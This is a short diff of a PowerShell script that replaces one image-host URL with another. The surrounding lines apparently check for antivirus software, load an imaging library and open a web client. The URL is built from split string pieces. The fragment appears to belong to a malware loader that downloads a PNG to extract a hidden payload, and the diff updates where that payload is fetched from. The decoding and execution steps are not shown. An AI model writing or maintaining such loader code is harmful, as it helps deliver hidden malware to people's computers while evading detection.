@@ -52,7 +52,7 @@ if($avInfo) {
 
 Add-Type -AssemblyName System.Drawing;
 $urlPrefix2 = "https://";
-$imageUrl2 = "i.ibb.co/Mk72ZRQ6/ervqt4eoyg9.png";
+$imageUrl2 = "i.ibb.co/SDt4cm0k/ervqt4eoyg9.png";
 $fullUrl2 = $urlPrefix2 + $imageUrl2;
 
 $webClient2 = New-Object System.Net.WebClient;
